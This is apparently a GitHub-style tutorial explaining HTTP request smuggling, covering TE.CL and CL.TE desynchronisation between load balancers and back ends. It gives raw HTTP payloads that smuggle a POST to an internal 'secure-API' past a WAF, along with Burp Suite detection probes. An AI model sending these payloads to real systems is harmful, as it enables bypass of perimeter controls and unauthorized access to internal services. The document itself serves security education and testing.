# HTTPRequestSmuggling
ELI5/ Deep Dive - HTTTP Request Smuggling


## TL;DR - What is it?
Read: https://portswigger.net/web-security/request-smuggling

### Why write this article?
IMO, the explanation given on portswigger, while good, glosses over some details, as well as encourages the use of the HTTPRequestSmuggling extension in Burp, which does not help in the understanding of the nature of this vulnerability.

## Lets dive!

#### So why exactly is this dangerous from a security perspective?

Most modern web application infrastructure consists of one or many load balancers/WAFs, which sit in front of actual application servers. Typically, the trust model for these is that traffic to the load balancer from the outside internet is seen as unsafe, but traffic from the load balancer to the application server or from the application server itself is safer as it has made it past the load balancer security controls.

Consider this: In the below diagram, we see some sort of WAF/Load Balancer that sits in front of several API gateways. If the infrstructure is such that the assumption is that illegitemate/unsafe traffic is prevented from hitting the API's via the WAF, then smuggling requests past the WAF enable us to send requests to API endpoints that we were not allowed to send requests from outside the security perimeter.

![Alt text](images/application.png "Application")

## Example
The following POST request is an example of smuggling a POST request to an internal API named `secure-API` In this case, we are dealing with the load balancer accepting the `Transfer-Encoding` header, and the API accepting the `Content-Length` this is called a `TE.CL` attack.

```
POST / HTTP/1.1
Host: test.mysite.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://somesite.net
DNT: 1
Connection: close
Cookie: session=F9Rf9fqjQ37lLSBDd3EHEpehDygMs75i
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

68
POST /secure-API HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

foo=ba
0


```
Sending this request twice will have the intended affect of POST'ing `foo=bar` to the `secure-API` resource.

### Why does this work?
1. The first evaluation is by the load balancer that supports the `Transfer-Encoding` header, it observes that the length of the body of the request should be 104 chars long, <b> the `Transfer-Encoding` length is specified in Hex hence `68` </b> which is the decimal equivalent of 104. Thus the first chunk ends at the beginning of the line that contains 0 <b>(remember each newline also counts as a byte!)</b>b. The second chunk is processed as 0 which is read as the end of the request
2. The request is forwarded to a server that then supports `Content-Length` which sees that the request body should only be 3 bytes long, however what isn't shown to us is that after each line of text in the body of the request, there is a `\r\n` which counts for 2 bytes ([Read more on that here](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields))

Given that each line is delimited with `\r\n` and given 3 bytes to work with, the server reads up to the end of `68\r`

The remaining 

```
\n
POST /secure-API HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

foo=ba
0
```
Is left on the server and will prepend any incoming request!
<b>PLEASE NOTE:</b> The `\n` character is not typically shown in the body of requests but has been shown ehre for illistration purposes


### Enumeration
* The following are some tips and tricks for finding this vulnerability given a CL.TE, TE.CL, and TE.TE 
* Assuming you are using Burp Suite as a proxy for your requests

#### CL.TE
* Front end: `Content-Length` 
* Back end: `Transfer-Encoding`

<b>Sample payload to test for this vulnerability:</b>

```
POST / HTTP/1.1
Host: testsite.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: testsite.net
DNT: 1
Connection: close
Cookie: session=QMTalM9bAXDIzKysRmDNfI8VyGbvcBcl
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Transfer-Encoding: chunked

0

GGGG
```
<b> Things to remember for CL.TE</b>
* In Burp MAKE SURE that `Update Content Length` is checked in the repeater menu, this is the opposite for a TE.CL vulnerability
* Make sure that the request ends AS IS, this is also opposite a TE.CL vulnerability where you want to add two returns at the end of the request.

<b>What to look for</b>
The payload `GGGG` Should be left on the server and will prepend incoming requests, so the server should respond after the second request with a 400 error and a message like `"Unrecognized method GGGGPOST"`

#### TE.CL

* Front end: `Transfer-Encoding` 
* Back end: `Content-Length`

<b>Sample payload to test for this vulnerability:</b>

```
POST / HTTP/1.1
Host: test.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: test.site
DNT: 1
Connection: close
Cookie: session=x9ptL2cydDdz9hu8XYCTeVhJruYH5Ehu
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
<b> Things to remember for TE.CL</b>
* Notice that below 0 in the second POST request there are 2 newlines, which are interpreted as the 2 Carriage Return-Line Feeds required to terminate an HTTP request, if you are testing in Burp you need to add those MANUALLY by hitting Enter twice.
* Make sure that the `Update Content-Length` option is unchecked in the repeater menu

<b>What to look for:</b> Since this test payload POST's to `/404` the first request to the server should return a `200 OK` and the second request should return a ` 404 not found` 


